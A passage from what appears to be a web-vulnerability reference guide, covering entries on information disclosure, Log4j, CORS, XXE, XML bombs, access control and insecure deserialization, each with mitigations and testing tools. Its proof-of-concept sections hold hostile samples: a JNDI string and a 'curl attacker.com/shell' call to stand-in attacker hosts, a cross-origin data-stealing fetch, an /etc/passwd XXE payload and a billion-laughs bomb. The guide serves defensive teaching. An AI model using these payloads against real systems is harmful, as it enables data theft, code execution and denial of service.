- Perform access control checks for **every** sensitive action

---

## 🧪 Testing Tools / Techniques:

- Manual privilege escalation attempts (IDOR testing)
- Intercept and modify requests using:
  - Burp Suite
  - Postman
- Test hidden parameters or functions (e.g., `?is_admin=true`)
- Check for horizontal (same-level) and vertical (privilege-level) escalation
- Use tools like:
  - `AuthMatrix` (Burp extension)
  - `AccessControlTestingProject`

---

## 🔗 References:

- OWASP Top 10: [Broken Access Control (A01:2021)](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- CWE-284: [Improper Access Control](https://cwe.mitre.org/data/definitions/284.html)
- PortSwigger: [Access control vulnerabilities](https://portswigger.net/web-security/access-control)
- OWASP: [Access Control Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Access_Control_Cheat_Sheet.html)

***
# WEBVULN-036: Information Disclosure

---

## 🏷️ Category:
Information Disclosure

---

## 🐞 Vulnerability:
Unintended Information Disclosure

---

## 📖 Description:

Information disclosure vulnerabilities occur when an application unintentionally exposes sensitive data to unauthorized users. This may include technical details, internal files, system paths, credentials, or user data.

Common causes include:

- Stack traces and error messages in production
- Exposed `.git/`, `.env`, `debug.log`, or `config.php` files
- Sensitive data in comments, JavaScript files, or hidden form fields
- Verbose HTTP headers or debug APIs
- Disclosure via metadata in uploaded files (e.g., EXIF, DOCX info)

This information can aid in further exploitation such as privilege escalation, enumeration, or targeted attacks.

---

## 💥 Demo / Proof of Concept:

**Example 1: Stack trace in response**

```
GET /api/user?id=abc HTTP/1.1

Response:
TypeError: unsupported operand type(s) for +: 'int' and 'str'
at /var/www/html/api/user.py line 42
```

**Example 2: Exposed environment file**

```
https://example.com/.env

Response:
APP_KEY=base64:abc123
DB_PASSWORD=supersecret
```

---

## 🛡️ Mitigation:

- Disable verbose error messages in production
- Block access to sensitive files and directories via web server config
- Strip metadata from uploaded documents and images
- Avoid leaving sensitive data in comments, frontend code, or hidden inputs
- Sanitize server responses to avoid leaking stack traces or paths
- Use content security headers to prevent unintended information leaks
- Run regular audits and leak detection scans on deployed assets

---

## 🧪 Testing Tools / Techniques:

- Manual browsing for `.env`, `.git/`, `debug.log`, `backup.zip`, etc.
- Check for detailed error messages in responses
- Inspect source code, JS files, and HTML comments
- Use recon tools like:
  - `dirsearch`, `gobuster`, `ffuf`
  - `truffleHog`, `GitLeaks`
- Shodan/Censys searches for open metadata or files
- Analyze file metadata with `exiftool`

---

## 🔗 References:

- OWASP: [Information Leakage](https://owasp.org/www-community/Information_Leakage)
- OWASP Testing Guide: [Testing for Information Leakage](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Information_Leakage.html)
- GitHub: [truffleHog](https://github.com/trufflesecurity/trufflehog)
- GitHub: [GitLeaks](https://github.com/gitleaks/gitleaks)

***
# WEBVULN-037: Unpatched Software

---

## 🏷️ Category:
Security Misconfiguration / Vulnerable Components

---

## 🐞 Vulnerability:
Use of Unpatched or Outdated Software

---

## 📖 Description:

Running outdated or unpatched software introduces critical vulnerabilities that attackers can exploit. This includes:

- Web servers (e.g., Apache, Nginx)
- Application frameworks (e.g., Django, Laravel, Spring)
- CMS platforms (e.g., WordPress, Joomla)
- Libraries and packages (e.g., jQuery, Log4j, OpenSSL)

Attackers often scan for known CVEs affecting popular software and automate exploitation of systems that haven't applied patches or updates.

---

## 💥 Demo / Proof of Concept:

Example: Vulnerable Log4j (CVE-2021-44228)

Request:

```
User-Agent: ${jndi:ldap://malicious.attacker.com/a}
```

Unpatched server triggers the request and fetches malicious payload from attacker-controlled LDAP server, resulting in remote code execution.

Another example: Old jQuery with known XSS bugs

```
<script src="https://cdn.example.com/jquery-1.7.2.min.js"></script>
```

Version known to have publicly documented vulnerabilities.

---

## 🛡️ Mitigation:

- Maintain an asset inventory to track software and versions
- Apply security patches and updates promptly
- Subscribe to vendor and CVE mailing lists for alerts
- Use vulnerability scanners and dependency checkers (e.g., Snyk, OWASP Dependency-Check)
- Prefer managed or containerized environments with patch automation
- Implement a DevSecOps process with CI/CD security checks
- Remove unused or deprecated software components

---

## 🧪 Testing Tools / Techniques:

- Use software inventory and SBOM (Software Bill of Materials)
- Vulnerability scanners:
  - `OpenVAS`
  - `Nessus`
  - `Nmap` with version detection
- Dependency analysis tools:
  - `OWASP Dependency-Check`
  - `Snyk`
  - `Retire.js`
- Compare software versions against CVE databases
- Check for default credentials or config leaks in legacy software

---

## 🔗 References:

- OWASP Top 10: [Vulnerable and Outdated Components (A06:2021)](https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/)
- NIST National Vulnerability Database: [https://nvd.nist.gov/](https://nvd.nist.gov/)
- CVE Details: [https://www.cvedetails.com/](https://www.cvedetails.com/)
- OWASP Dependency-Check: [https://owasp.org/www-project-dependency-check/](https://owasp.org/www-project-dependency-check/)

***
# WEBVULN-038: Misconfigured CORS

---

## 🏷️ Category:
Security Misconfiguration / Access Control

---

## 🐞 Vulnerability:
Misconfigured Cross-Origin Resource Sharing (CORS)

---

## 📖 Description:

CORS is a security feature that controls how web resources on one domain can be requested from another domain. When CORS is misconfigured, it may allow unauthorized cross-origin requests, exposing sensitive APIs or data to malicious websites.

Common misconfigurations include:

- Using wildcard (`*`) for `Access-Control-Allow-Origin` on endpoints that return sensitive data
- Reflecting arbitrary origins (`Access-Control-Allow-Origin: <user-controlled origin>`)
- Enabling `Access-Control-Allow-Credentials: true` with wildcard origins

This can allow an attacker to perform cross-origin requests and read sensitive data from the victim’s session.

---

## 💥 Demo / Proof of Concept:

Server response:

```
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true
```

Malicious script hosted on attacker.com:

```js
fetch("https://vulnerable-site.com/api/user/profile", {
  credentials: "include"
})
.then(res => res.text())
.then(data => {
  console.log("Stolen data:", data);
});
```

If the victim is logged in to vulnerable-site.com, this script will steal private profile data due to improper CORS settings.

---

## 🛡️ Mitigation:

- Never use `Access-Control-Allow-Origin: *` for endpoints that serve sensitive data
- Avoid dynamically reflecting origins without a strict whitelist
- Only set `Access-Control-Allow-Credentials: true` when absolutely necessary, and **never** with `*` as the origin
- Implement proper authentication and authorization on the server-side, regardless of CORS
- Conduct regular security reviews and automated checks on CORS headers
- Use CSP (Content Security Policy) to reduce impact of possible abuse

---

## 🧪 Testing Tools / Techniques:

- Manually inspect CORS headers using browser dev tools or curl:
  - `curl -I -H "Origin: https://evil.com" https://target.com/api`
- Use CORS scanning tools:
  - `CORScanner`
  - `CORS Misconfiguration Scanner (by @chenjj)`
  - `Burp Suite CORS plugins`
- Test with `Access-Control-Allow-Credentials` enabled in combination with `*` or reflected origins
- Verify behavior across various endpoints, not just `/api`

---

## 🔗 References:

- OWASP: [CORS Security](https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny)
- Mozilla Docs: [CORS Explained](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
- CORScanner: [https://github.com/chenjj/CORScanner](https://github.com/chenjj/CORScanner)
- Blog: [CORS Misconfigurations and Exploits](https://portswigger.net/web-security/cors)

***
***

# WEBVULN-039: HTTP Security Headers Misconfigurations

---

## 🏷️ Category:
Security Misconfiguration

---

## 🐞 Vulnerability:
Missing or Misconfigured HTTP Security Headers

---

## 📖 Description:

HTTP security headers help protect web applications from a wide range of attacks, including XSS, clickjacking, and data injection. When these headers are missing or improperly configured, browsers cannot enforce critical security policies, leaving the application vulnerable.

Commonly missing or misconfigured headers include:

- `Content-Security-Policy` (CSP)
- `X-Content-Type-Options`
- `X-Frame-Options`
- `Strict-Transport-Security` (HSTS)
- `Referrer-Policy`
- `Permissions-Policy`
- `Cross-Origin-Resource-Policy`

---

## 💥 Demo / Proof of Concept:

Check HTTP response headers:

```
HTTP/1.1 200 OK
Content-Type: text/html
Server: Apache/2.4.41
```

Missing:

- `Content-Security-Policy`
- `Strict-Transport-Security`
- `X-Frame-Options`
- `X-Content-Type-Options`

Consequence: site is susceptible to clickjacking, MIME-sniffing, and XSS via unsafe inline scripts.

---

## 🛡️ Mitigation:

Set appropriate security headers in your web server or app framework configuration:

```http
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
Content-Security-Policy: default-src 'self'
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Referrer-Policy: no-referrer
Permissions-Policy: camera=(), microphone=(), geolocation=()
```

- Use CSP to control resources the browser is allowed to load
- Enable HSTS to enforce HTTPS communication
- Prevent clickjacking with `X-Frame-Options`
- Avoid MIME-type sniffing with `X-Content-Type-Options`

---

## 🧪 Testing Tools / Techniques:

- Use browser dev tools to inspect response headers
- Online scanners:
  - [securityheaders.com](https://securityheaders.com/)
  - [Mozilla Observatory](https://observatory.mozilla.org/)
- CLI tools:
  - `curl -I https://target.com`
  - `Nikto`
  - `testssl.sh`

---

## 🔗 References:

- OWASP: [HTTP Headers Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html)
- Mozilla: [HTTP Headers Guide](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers)
- Scott Helme: [SecurityHeaders.com](https://securityheaders.com/)
- OWASP Secure Headers Project: [https://owasp.org/www-project-secure-headers/](https://owasp.org/www-project-secure-headers/)

***
## PART V
## XML Related Vulnerabilities:

***
# Web Vulnerability Entry

## 🏷️ Category

Injection

## 🆔 Vulnerability ID

WEBVULN-040

## 🐞 Vulnerability

**XML External Entity (XXE) Injection**

## 📝 Description

XXE occurs when an application processes XML input that allows external entity references to be resolved within the XML document.  
If improperly configured XML parsers are used, attackers can exploit XXE to:

- Access sensitive files on the server (e.g., `/etc/passwd`)
- Perform server-side request forgery (SSRF)
- Conduct denial-of-service (DoS) attacks
- Leak internal network information

XXE vulnerabilities arise mainly due to insecure default configurations in XML parsers that allow the resolution of external entities.

---

## 🧪 Demo / Proof of Concept

Example vulnerable XML input:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```
## 🛡️ Mitigation
- Disable external entity resolution in XML parsers.
- Use less complex data formats like JSON when possible.
- Validate and sanitize XML input strictly.
- Use secure libraries and parser configurations:
  - In Java: `factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);`
  - In Python (lxml): `resolve_entities=False`
- Keep libraries and dependencies updated.

## 🧪 Testing Tools / Techniques
- Burp Suite (with "XXE Injection" payloads)
- OWASP ZAP
- Manual testing with crafted XML payloads
- Automated scanning using Nuclei templates
- Review XML parser configurations in source code

## 📚 References
- [OWASP XXE Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [PortSwigger - XXE Exploitation](https://portswigger.net/web-security/xxe)
- [CWE-611: Improper Restriction of XML External Entity Reference ('XXE')](https://cwe.mitre.org/data/definitions/611.html)
- [OWASP Top 10 2021 - A05: Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)

***
# Web Vulnerability Entry

## 🏷️ Category
Injection

## 🆔 Vulnerability ID
WEBVULN-041

## 🐞 Vulnerability
**XML Entity Expansion (XEE)**

## 📝 Description
XEE (XML Entity Expansion) occurs when an XML parser processes documents containing many nested or recursive entity declarations, causing resource exhaustion (e.g., CPU, memory, disk space).  
This can lead to **Denial of Service (DoS)** attacks, even if external entities (XXE) are properly disabled.

XEE is a form of "Billion Laughs Attack" where a small XML payload can expand into gigabytes of memory consumption, crashing or severely slowing the target application.

---

## 🧪 Demo / Proof of Concept

Example of a **Billion Laughs** attack payload:

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
 <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
 <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
 <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
 <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
 <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```
## 🛡️ Mitigation
- Limit the depth of entity expansion and nesting in XML parsers.
- Set appropriate limits on memory usage, entity count, and expansion size.
- Disable DTD (Document Type Definition) processing entirely if not required.
- Prefer safer data formats like JSON instead of XML when possible.
- Update XML parsing libraries to versions that defend against entity expansion attacks.

## 🧪 Testing Tools / Techniques
- Burp Suite (custom XML payloads with heavy nesting)
- OWASP ZAP
- Manual testing using crafted XMLs
- Source code review for XML parser configurations
- Fuzzing XML inputs with tools like Defensics

## 📚 References
- [OWASP XML Entity Expansion (XEE) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_Entity_Expansion_Prevention_Cheat_Sheet.html)
- [OWASP Billion Laughs Attack](https://owasp.org/www-community/attacks/Billion_Laughs_Attack)
- [CWE-776: Improper Restriction of Recursive Entity References in DTDs ('Billion Laughs')](https://cwe.mitre.org/data/definitions/776.html)

***
# Web Vulnerability Entry

## 🏷️ Category
Denial of Service (DoS)

## 🆔 Vulnerability ID
WEBVULN-042

## 🐞 Vulnerability
**XML Bomb Document (aka "Billion Laughs" attack)**

## 📝 Description
An **XML Bomb** (also known as **Billion Laughs Attack**) is a form of **Denial of Service (DoS)** attack where an XML document is designed to cause excessive resource consumption by recursively defining entities. A single, small XML payload can recursively expand into an enormous amount of data, causing a system to crash or run out of resources.

This attack relies on exploiting XML parsers that fail to limit entity expansion. The most famous example is the **Billion Laughs Attack**, where the document recursively defines entities in a way that makes it blow up in size when processed.

### Example XML Bomb Payload

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
 <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
 <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
 <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
 <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
 <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```
## 🛡️ Mitigation
- Limit the number of entities and depth of entity references in XML parsers.
- Set memory and recursion limits for XML parsers to prevent resource exhaustion.
- Disable DTD (Document Type Definition) processing when not required.
- Use alternative formats like JSON or YAML if possible to avoid XML-based attacks.
- Use libraries that explicitly limit or prevent entity expansion in XML parsing.

## 🧪 Testing Tools / Techniques
- Burp Suite (with recursive XML payloads)
- OWASP ZAP
- Defensics Fuzzing Tool (to generate malicious XML payloads)
- Manual testing using crafted XML bombs
- Review XML parser configurations for recursion depth limits

## 📚 References
- OWASP XML Bomb Prevention Cheat Sheet
- OWASP Billion Laughs Attack
- CWE-770: Allocation of Resources Without Limits or Throttling
- OWASP Top 10 2021 - A06: Vulnerable and Outdated Components

***
## PART VI
---
## Broken Access Control
***
## 🛡️ WebVuln #43: Inadequate Authorization

### 🗂️ Category
Access Control

### 🐞 Vulnerability
Inadequate Authorization

### 📖 Description
Inadequate authorization occurs when an application fails to properly verify whether a user has the necessary permissions to access a resource or perform an action. This often results in privilege escalation, horizontal or vertical access control bypass, or unauthorized access to sensitive data.

Unlike authentication, which verifies identity, **authorization** ensures that an authenticated user has the right permissions. Failing to enforce authorization checks leads to critical security flaws.

### 💣 Demo / Proof of Concept
1. A user with a "basic" account manually modifies a URL or request to access `/admin/dashboard`.
2. The server does not check the user's role or permissions and grants access.
3. The user can now view or manipulate administrative data without authorization.

### 🛡️ Mitigation
- Enforce **role-based access control (RBAC)** and validate authorization on the server side.
- Never rely on client-side controls (e.g., hidden fields or JavaScript checks) for access decisions.
- Use centralized authorization middleware for consistent policy enforcement.
- Validate all requests against a permission matrix (user-role-action-resource).
- Perform **least privilege principle** by default.
- Log and monitor access attempts for sensitive endpoints.

### 🧪 Testing Tools / Techniques
- Manual testing by manipulating request paths or parameters (e.g., changing `/user/123` to `/user/124`).
- Burp Suite (Repeater and Intruder).
- OWASP ZAP with access control testing add-ons.
- Review of server-side code logic and authorization checks.
- Automated scanning using tools like Nuclei and Postman collections.

### 📚 References
- [OWASP Access Control Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Access_Control_Cheat_Sheet.html)
- [CWE-285: Improper Authorization](https://cwe.mitre.org/data/definitions/285.html)
- [OWASP Top 10 - A01:2021 Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [PortSwigger - Access Control Vulnerabilities](https://portswigger.net/web-security/access-control)
***
## 🛡️ WebVuln #44: Privilege Escalation

### 🗂️ Category
Access Control

### 🐞 Vulnerability
Privilege Escalation

### 📖 Description
Privilege escalation occurs when a user gains unauthorized access to resources or functions that are normally restricted to users with higher privileges. It can be classified into two types:

- **Vertical Privilege Escalation**: A lower-privileged user gains access to admin-level or system-level functionalities.
- **Horizontal Privilege Escalation**: A user accesses resources or data belonging to another user with the same privilege level.

This vulnerability often results from insecure direct object references (IDOR), missing authorization checks, misconfigured roles, or flaws in session management.

### 💣 Demo / Proof of Concept
1. A regular user notices that accessing `/admin/settings` returns a 403 error.
2. By manipulating cookies, JWT tokens, or session variables (e.g., setting `role=admin`), the user gains admin access.
3. The server fails to validate the user's actual privileges, granting elevated access.

### 🛡️ Mitigation
- Enforce **strict server-side role validation** for every protected action or resource.
- Implement **least privilege principles** by default.
- Sanitize and secure all tokens, cookies, and session data.
- Avoid trusting client-side input for privilege decisions.
- Apply consistent access control policies across all services and endpoints.
- Regularly audit role configurations and permission mappings.
- Log and alert on suspicious privilege changes or access attempts.

### 🧪 Testing Tools / Techniques
- Manual inspection of role-based functionality (e.g., URL tampering).
- Burp Suite (modifying session data or cookies).
- OWASP ZAP (access control testing).
- Fuzzing APIs and endpoints for privilege bypass.
- Code review focused on role checks and access validation.

### 📚 References
- [OWASP Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [CWE-269: Improper Privilege Management](https://cwe.mitre.org/data/definitions/269.html)
- [PortSwigger - Privilege Escalation](https://portswigger.net/web-security/access-control/privilege-escalation)
- [OWASP Access Control Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Access_Control_Cheat_Sheet.html)

***
## 🛡️ WebVuln #45: Insecure Direct Object References (IDOR)

### 🗂️ Category
Access Control

### 🐞 Vulnerability
Insecure Direct Object References (IDOR)

### 📖 Description
IDOR occurs when an application exposes a reference to an internal object (such as a file, database record, or key) and fails to properly authorize whether the user should access it. This leads to unauthorized data access or modification by simply changing object identifiers in the request.

IDOR vulnerabilities are commonly exploited through URL manipulation, query parameters, or API calls, and often result from missing or inadequate access control.

### 💣 Demo / Proof of Concept
1. A user accesses their own invoice at:  
   `GET /invoices/1001`
2. The user manually changes the ID to:  
   `GET /invoices/1002`
3. The server returns another user's invoice without validating ownership or access rights.

### 🛡️ Mitigation
- Always perform **authorization checks on the server** for every request.
- Do not expose predictable identifiers (like sequential IDs); use UUIDs or hashed references.
- Implement **object ownership validation** at the controller or service level.
- Use **indirect references** (e.g., tokens or scoped IDs) where possible.
- Log and monitor for suspicious access patterns.

### 🧪 Testing Tools / Techniques
- Manual tampering of URL or API parameters (ID fuzzing).
- Burp Suite (Repeater and Intruder modules).
- OWASP ZAP with IDOR-specific test scripts.
- Automated tools like Nuclei or Ffuf for endpoint probing.
- Code review for missing access control before object fetches.

### 📚 References
- [OWASP IDOR Explanation](https://owasp.org/www-community/attacks/Insecure_Direct_Object_References)
- [CWE-639: Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html)
- [OWASP Top 10 - A01:2021 Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [PortSwigger - IDOR](https://portswigger.net/web-security/access-control/idor)

***

## 🛡️ WebVuln #46: Forceful Browsing

### 🗂️ Category
Access Control

### 🐞 Vulnerability
Forceful Browsing

### 📖 Description
Forceful browsing is a technique where an attacker manually guesses or manipulates URLs or file paths to access resources they are not authorized to view. This can include administrative interfaces, unlinked pages, or sensitive files that are not properly protected by authentication and authorization mechanisms.

The vulnerability arises when access controls are not consistently enforced on server-side resources, allowing attackers to bypass navigation controls and access restricted content directly.

### 💣 Demo / Proof of Concept
1. A user with a basic account accesses:  
   `https://example.com/user/dashboard`
2. They attempt to access:  
   `https://example.com/admin/dashboard` or `https://example.com/config/backup.zip`
3. If the server does not check authorization properly, access may be granted.

### 🛡️ Mitigation
- Enforce **strict access control checks** on the server side for every resource.
- Do not rely solely on security-through-obscurity (e.g., hidden URLs).
- Use **role-based access control (RBAC)** or **attribute-based access control (ABAC)**.
- Keep sensitive files out of the web root.
- Implement proper error handling (e.g., return 403 instead of 404 when access is denied).

### 🧪 Testing Tools / Techniques
- Manual URL manipulation and path traversal testing.
- Burp Suite (using Intruder or Content Discovery features).
- OWASP ZAP (Forced Browsing plugin).
- Tools like Dirb, Dirbuster, Gobuster, or Ffuf for brute-forcing directories and files.
- Review server-side access control logic and route protection.

### 📚 References
- [OWASP Forced Browsing](https://owasp.org/www-community/attacks/Forced_browsing)
- [CWE-552: Files or Directories Accessible to External Parties](https://cwe.mitre.org/data/definitions/552.html)
- [OWASP Top 10 - A01:2021 Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [PortSwigger - Forced Browsing](https://portswigger.net/web-security/access-control/forced-browsing)

***
## 🛡️ WebVuln #47: Missing Function Level Access Control

### 🗂️ Category
Access Control

### 🐞 Vulnerability
Missing Function Level Access Control

### 📖 Description
Missing Function Level Access Control occurs when an application exposes functionality (usually via endpoints or routes) that should be restricted to certain users but fails to enforce access controls. Even if the UI hides these functions, an attacker can invoke them directly by crafting requests to backend endpoints.

This often leads to unauthorized access to sensitive operations such as administrative actions, user management, or system configurations.

### 💣 Demo / Proof of Concept
1. A regular user inspects the web application and notices no "Delete User" button in the UI.
2. They observe admin actions using tools like Burp Suite, noting a `POST /admin/delete_user?id=123`.
3. The user crafts the same request manually.
4. If the server does not check their role, the deletion is processed despite lacking permission.

### 🛡️ Mitigation
- Enforce **server-side authorization checks** for every function and endpoint.
- Do not rely solely on client-side controls (like hiding buttons or links).
- Implement **role-based or attribute-based access control** consistently.
- Use a centralized access control mechanism to avoid fragmented logic.
- Regularly audit endpoints for unprotected functionality.

### 🧪 Testing Tools / Techniques
- Burp Suite (Repeater to replay admin functions as a low-privilege user).
- OWASP ZAP for automated access control testing.
- Review application routes and APIs for missing access checks.
- Manual browsing of hidden or undocumented admin URLs.
- Code review of backend logic for authorization enforcement.

### 📚 References
- [OWASP Top 10 - A01:2021 Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [OWASP Access Control Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Access_Control_Cheat_Sheet.html)
- [CWE-285: Improper Authorization](https://cwe.mitre.org/data/definitions/285.html)
- [PortSwigger - Access Control Vulnerabilities](https://portswigger.net/web-security/access-control)

***
## PART VII 
---
## INSECURE DESERIALIZATION 

***
## 🛡️ WebVuln #48: Remote Code Execution via Insecure Deserialization

### 🗂️ Category
Code Execution / Insecure Deserialization

### 🐞 Vulnerability
Remote Code Execution (RCE) via Insecure Deserialization

### 📖 Description
Insecure deserialization occurs when untrusted or user-controlled data is deserialized by an application without proper validation, allowing an attacker to manipulate serialized objects and inject malicious data. If the application deserializes objects that include executable code, it can lead to arbitrary remote code execution (RCE), privilege escalation, or denial of service (DoS).

This vulnerability is especially critical in languages like Java, PHP, Python, and .NET, where deserialization can invoke class constructors, magic methods, or execute arbitrary code.

### 💣 Demo / Proof of Concept

1. A vulnerable endpoint expects serialized data:

    ```http
    POST /api/deserialize HTTP/1.1
    Content-Type: application/octet-stream

    <malicious serialized object>
    ```

2. The attacker crafts a serialized payload with a command execution gadget chain using a tool like `ysoserial`.

3. Once submitted, the server deserializes the object and executes the embedded system command, e.g.,

    ```java
    Runtime.getRuntime().exec("curl attacker.com/shell");
    ```

### 🛡️ Mitigation
- Avoid deserializing data from untrusted sources.
- Use safe serialization formats like JSON or XML (without executable metadata).
- Implement strict type checking and allowlisting of classes allowed for deserialization.
- Use libraries that support safe deserialization or sandboxed execution.
- Apply input validation before deserialization.
- Monitor for signs of deserialization abuse (e.g., suspicious classes in memory or outbound connections).
- In Java, disable dangerous features (e.g., `readObject`) and use serialization filters.

### 🧪 Testing Tools / Techniques
- Manual crafted payloads for known gadget chains.
- `ysoserial` (Java), `PHPGGC` (PHP), or `Marshalsec` (Java) for payload generation.
- Burp Suite for intercepting and modifying serialized requests.
- OWASP ZAP for detecting deserialization issues.
- Static code analysis to find deserialization calls on untrusted data.

### 📚 References
- [OWASP Insecure Deserialization](https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data)
- [OWASP Top 10 - A08:2021 Software and Data Integrity Failures](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/)
- [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
- [PortSwigger - Deserialization Vulnerabilities](https://portswigger.net/web-security/deserialization)
- [ysoserial GitHub](https://github.com/frohoff/ysoserial)
***
## 🛡️ WebVuln #49: Data Tampering

### 🗂️ Category
Input Validation / Integrity Violation

### 🐞 Vulnerability
Data Tampering

### 📖 Description
Data tampering refers to the unauthorized alteration of data as it flows between a client and server or while it is stored. This may involve modifying URL parameters, hidden form fields, cookies, or any data transmitted over the network without proper validation or integrity checks.

Attackers exploit this vulnerability to manipulate data such as user roles, pricing, permissions, or sensitive identifiers to gain unauthorized access or cause logical flaws in the system.

### 💣 Demo / Proof of Concept

1. A shopping cart stores item prices in hidden form fields:
    ```html
    <input type="hidden" name="price" value="100">
    ```

2. An attacker intercepts the request using a proxy like Burp Suite and changes the price to:
    ```html
    <input type="hidden" name="price" value="1">
    ```

3. If the server accepts this data without revalidation, the attacker purchases an item for 1 unit of currency.

### 🛡️ Mitigation
- Never trust data from the client-side. Always revalidate critical data on the server.
- Use session storage or server-side calculations for sensitive data like pricing and roles.
- Apply integrity checks (e.g., HMAC, digital signatures) for critical client-submitted data.
- Use HTTPS to prevent interception and tampering in transit.
- Implement input validation and type checking on all user inputs.

### 🧪 Testing Tools / Techniques
- Burp Suite for intercepting and modifying client-server communication.
- OWASP ZAP for automated detection of parameter manipulation.
- Manual testing by altering request parameters, cookies, and hidden fields.
- Source code review to check if data validation is done on the server side.

### 📚 References
- [OWASP Data Validation](https://owasp.org/www-community/Input_Validation)
- [OWASP Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [CWE-472: External Control of Assumed-Immutable Web Parameter](https://cwe.mitre.org/data/definitions/472.html)
- [PortSwigger: Parameter Tampering](https://portswigger.net/web-security/parameter-tampering)
***
## 🛡️ WebVuln #50: Object Injection

### 🗂️ Category
Code Injection / Deserialization / Application Logic

### 🐞 Vulnerability
Object Injection

### 📖 Description
Object Injection is a vulnerability that occurs when user input is passed to the `unserialize()` function or equivalent in a language like PHP without proper validation. It allows an attacker to inject arbitrary objects into the application context, potentially triggering magic methods such as `__wakeup()`, `__destruct()`, or `__toString()` that lead to code execution, file manipulation, or application logic corruption.

The vulnerability arises due to poor input sanitization and the dynamic nature of object deserialization.

### 💣 Demo / Proof of Concept

1. A PHP application unserializes data from a user-supplied cookie:

    ```php
    $user = unserialize($_COOKIE['user']);
    ```

2. The attacker crafts a payload using a gadget chain to call a dangerous method:

    ```php
    O:4:"User":1:{s:8:"username";s:5:"admin";}
    ```

3. If a magic method like `__destruct()` or `__wakeup()` in the class `User` performs file operations, the attacker may achieve Remote Code Execution (RCE), arbitrary file deletion, or privilege escalation.

### 🛡️ Mitigation
- Never unserialize user-controlled input.
- Use safe serialization formats like JSON where applicable.
- Implement a class allowlist for deserialization.
- Avoid magic methods in classes that are ever serialized or deserialized.
- Use hardened libraries and wrappers that enforce safe deserialization.
- Apply input validation before any deserialization operation.
- Keep codebase and third-party packages updated to avoid gadget chain exploits.

### 🧪 Testing Tools / Techniques
- Manual payload crafting using tools like `PHPGGC` (PHP Generic Gadget Chains).
- Static code analysis to detect unsafe use of `unserialize()` or similar methods.
- Burp Suite to modify serialized objects in transit.
- Fuzzing with known serialization payloads.
- Review of classes with magic methods that could be triggered by injected objects.

